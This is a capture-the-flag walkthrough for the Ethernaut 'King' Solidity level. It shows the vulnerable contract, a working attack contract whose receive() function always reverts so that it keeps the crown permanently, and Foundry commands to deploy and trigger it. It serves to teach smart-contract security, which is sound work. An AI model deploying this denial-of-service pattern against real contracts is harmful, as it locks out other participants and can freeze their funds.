## King Level Outline

**Difficulty : 6/10**

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5)

## Solution
The contract espects to be interacting with an EOA but we can force a revert and keep the crown if we make a malicious contract the king.

To make sure that we keep the crown when someone tries to claim it. We create a malicious fallback function in our contract which will revert after receiving ETH effectively keeping our malicious contract as the King.

### Walkthrough

##### 1. Create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract ImposterKing {
    address king;

    constructor(address _king) payable {
        king = _king;
    }

    function claimCrown() public payable {
        payable(king).call{value: msg.value}("");
    }

    receive() external payable {
        revert("I will keep the crown :)");
    }
}
```

##### 2. Deploy our new contract
```console
forge create src/Contract.sol:ImposterKing --constructor-args $LEVEL_ADDRESS --private-key  $PRIVATE_KEY
```

##### 3. Finding the current value of prize to see how much we need to overthrow the current king
```console
cast call $LEVEL_ADDRESS "prize()" | cast --to-dec
```
output
```console
1000000000000000
```
> take note that this is the value of prize in wei, meaning that we need to send more than 1000000000000000wei to become the new king

##### 4. Call the "claimCrown()" function on our newly deployed contract along with some eth
```console
cast send $DEPLOYED_ADDRESS "claimCrown()" --value 1000000000000001wei --gas 80000 --private-key=$PRIVATE_KEY 
```
> Replace $DEPLOYED_ADDRESS with the address of your deployed contract

### [:arrow_left: Back To Main Menu](../)
